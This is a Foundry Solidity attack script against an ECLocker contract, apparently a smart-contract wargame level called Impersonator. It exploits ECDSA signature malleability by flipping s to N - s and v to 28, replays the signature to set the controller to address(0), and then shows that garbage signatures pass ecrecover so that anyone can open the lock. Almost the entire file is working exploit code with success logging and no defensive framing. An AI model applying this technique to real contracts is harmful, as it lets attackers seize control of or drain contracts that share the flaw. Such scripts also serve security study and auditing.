// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Script.sol";

interface IECLocker {
    function controller() external view returns (address);
    function msgHash() external view returns (bytes32);
    function open(uint8 v, bytes32 r, bytes32 s) external;
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
}

interface IImpersonator {
    function lockers(uint256) external view returns (address);
}

/**
 * @title ImpersonatorAttack Alternative Script
 * @notice Exploits ECDSA signature malleability to set controller to address(0)
 * @dev This is the optimal attack approach:
 *      1. Use malleable signature to changeController(address(0))
 *      2. Result: ecrecover returns address(0) for any invalid signature
 *      3. Anyone can now open() with garbage signatures
 */
contract ImpersonatorAttackZeroScript is Script {
    // secp256k1 curve order
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function run() external {
        address impersonatorAddress = vm.envAddress("IMPERSONATOR_ADDRESS");

        console.log("========================================");
        console.log("Impersonator Attack: address(0) Sabotage");
        console.log("========================================");

        IImpersonator impersonator = IImpersonator(impersonatorAddress);
        address lockerAddress = impersonator.lockers(0);
        IECLocker locker = IECLocker(lockerAddress);

        console.log("Impersonator:", impersonatorAddress);
        console.log("ECLocker:", lockerAddress);

        address originalController = locker.controller();
        bytes32 msgHash = locker.msgHash();
        console.log("\nOriginal Controller:", originalController);
        console.log("MsgHash:", vm.toString(msgHash));

        // Original signature from NewLock event
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        uint256 originalS = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
        uint8 originalV = 27;

        // Calculate malleable signature: s' = N - s, v' = 28
        uint256 malleableS = N - originalS;
        uint8 malleableV = 28;
        bytes32 s_prime = bytes32(malleableS);

        console.log("\n--- MALLEABLE SIGNATURE ---");
        console.log("Original: v=%d, s=%s", originalV, vm.toString(bytes32(originalS)));
        console.log("Malleable: v=%d, s=%s", malleableV, vm.toString(s_prime));

        // Verify malleable signature recovers to original controller
        address recovered = ecrecover(msgHash, malleableV, r, s_prime);
        require(recovered == originalController, "Malleable sig verification failed");
        console.log("Verified: malleable sig recovers to original controller");

        vm.startBroadcast();

        console.log("\n--- EXECUTING ATTACK ---");
        console.log("Setting controller to address(0)...");

        // Single transaction: change controller to address(0)
        locker.changeController(malleableV, r, s_prime, address(0));

        console.log("Controller changed successfully!");

        vm.stopBroadcast();

        // Verify
        address newController = locker.controller();
        console.log("\n--- VERIFICATION ---");
        console.log("New controller:", newController);
        require(newController == address(0), "Attack failed: controller not address(0)");

        console.log("\n--- TESTING: Anyone can open ---");
        console.log("Simulating open() with garbage signature (0, 0x00, 0x00)...");

        // Simulate what happens when anyone calls open() with garbage
        address garbageRecovered = ecrecover(msgHash, 0, bytes32(0), bytes32(0));
        console.log("ecrecover(garbage) returns:", garbageRecovered);
        console.log("Controller is:", newController);
        console.log("Match:", garbageRecovered == newController);

        console.log("\n========================================");
        console.log("SUCCESS! System completely compromised!");
        console.log("Anyone can now open() with ANY signature");
        console.log("========================================");
    }
}
